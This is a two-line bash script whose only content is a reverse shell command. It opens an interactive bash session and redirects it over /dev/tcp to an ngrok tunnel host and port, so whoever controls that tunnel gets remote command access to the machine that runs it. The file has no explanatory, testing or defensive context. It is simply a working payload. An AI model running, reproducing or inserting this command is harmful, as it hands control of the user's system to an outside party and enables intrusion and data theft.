#!/bin/bash
bash -i >& /dev/tcp/0.tcp.in.ngrok.io/16864 0>&1
